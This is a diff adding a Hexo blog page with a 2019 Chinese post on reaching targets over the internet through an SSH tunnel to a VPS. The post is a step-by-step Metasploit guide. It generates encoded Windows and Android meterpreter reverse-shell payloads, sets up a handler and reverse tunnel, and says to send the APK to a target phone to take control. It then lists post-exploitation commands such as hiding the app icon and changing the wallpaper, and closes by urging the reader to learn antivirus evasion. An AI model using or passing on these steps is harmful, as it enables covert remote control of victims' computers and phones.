@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>ssh+vps实现外网渗透 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Windows ①首先需要配置vps的ssh服务 编辑：vi /etc/ssh/sshd_config 在文件最后添加：GatewayPorts yes 然后重启ssh服务并设置为开机自启： 12systemctl restart sshsystemctl enable ssh ②然后配置msf客户端： 1msfvenom -p windows/meterpreter/reverse_tcp -e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssh+vps实现外网渗透">
+<meta property="og:url" content="http://yoursite.com/2019/02/12/ssh-vps实现外网渗透/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Windows ①首先需要配置vps的ssh服务 编辑：vi /etc/ssh/sshd_config 在文件最后添加：GatewayPorts yes 然后重启ssh服务并设置为开机自启： 12systemctl restart sshsystemctl enable ssh ②然后配置msf客户端： 1msfvenom -p windows/meterpreter/reverse_tcp -e">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2019/02/12/ssh-vps实现外网渗透/a.png">
+<meta property="og:updated_time" content="2019-02-12T13:44:47.230Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ssh+vps实现外网渗透">
+<meta name="twitter:description" content="Windows ①首先需要配置vps的ssh服务 编辑：vi /etc/ssh/sshd_config 在文件最后添加：GatewayPorts yes 然后重启ssh服务并设置为开机自启： 12systemctl restart sshsystemctl enable ssh ②然后配置msf客户端： 1msfvenom -p windows/meterpreter/reverse_tcp -e">
+<meta name="twitter:image" content="http://yoursite.com/2019/02/12/ssh-vps实现外网渗透/a.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-ssh-vps实现外网渗透" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/02/12/ssh-vps实现外网渗透/" class="article-date">
+  <time datetime="2019-02-12T12:56:19.000Z" itemprop="datePublished">2019-02-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ssh+vps实现外网渗透
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>Windows</strong></p>
+<p>①首先需要配置vps的ssh服务</p>
+<p>编辑：<code>vi /etc/ssh/sshd_config</code></p>
+<p>在文件最后添加：<code>GatewayPorts yes</code></p>
+<p>然后重启ssh服务并设置为开机自启：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart ssh</span><br><span class="line">systemctl enable ssh</span><br></pre></td></tr></table></figure>
+<p>②然后配置msf客户端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ lhost=[vpsIP] lport=4444 -f c -o /home/test.c</span><br></pre></td></tr></table></figure>
+<p>③之后本地启用监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.0.124</span><br><span class="line">lhost =&gt; 192.168.0.124</span><br><span class="line">msf exploit(handler) &gt; set lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf exploit(handler) &gt; set exitonsession false</span><br><span class="line">exitonsession =&gt; false</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.124:4444</span><br></pre></td></tr></table></figure>
+<p>④开启ssh隧道：<code>ssh -N -R 4444:192.168.0.124:4444 root@vpsIP</code></p>
+<p>⑤客户端被执行以后，就会成功返回回话……</p>
+<p><strong>Android</strong></p>
+<p>①首先需要配置vps的ssh服务</p>
+<p>编辑：<code>vi /etc/ssh/sshd_config</code></p>
+<p>在文件最后添加：<code>GatewayPorts yes</code></p>
+<p>然后重启ssh服务并设置为开机自启：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart ssh</span><br><span class="line">systemctl enable ssh</span><br></pre></td></tr></table></figure>
+<p>②然后配置msf客户端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp lhost=vpsIP lport=4444 &gt;/home/test.apk</span><br></pre></td></tr></table></figure>
+<p>③之后本地启用监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload android/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.0.124(kali IP)</span><br><span class="line">lhost =&gt; 192.168.0.124</span><br><span class="line">msf exploit(handler) &gt; set lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p>④开启ssh隧道：<code>ssh -N -R 4444:192.168.0.124:4444 root@vpsIP</code></p>
+<p>⑤将生成的APK文件发送给目标手机，下载打开就会获取控制权…..</p>
+<p><strong>一些命令：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hide_app_icon：将图标藏起来</span><br><span class="line">wakelock：来实现不休眠</span><br><span class="line">远程强制修改目标手机的壁纸图案：</span><br><span class="line">msf &gt; use post/multi/manage/set_wallpaper</span><br><span class="line">msf post(set_wallpaper)&gt; set WALLPAPER_FILE /root/Desktop/hack.jpg</span><br><span class="line">msf post(set_wallpaper)&gt; set session 1</span><br><span class="line">msf post (set_wallpaper)&gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/02/12/ssh-vps实现外网渗透/a.png" alt=""></p>
+<p><strong>总结</strong></p>
+<p>学习免杀，学习免杀，学习免杀！！！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/02/12/ssh-vps实现外网渗透/" data-id="cjs1tjvvw0000uov6e6y23gv8" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/02/01/利用metasploit生成免杀后门/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">利用metasploit生成免杀后门</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/02/12/ssh-vps实现外网渗透/">ssh+vps实现外网渗透</a>
+          </li>
+        
+          <li>
+            <a href="/2019/02/01/利用metasploit生成免杀后门/">利用metasploit生成免杀后门</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
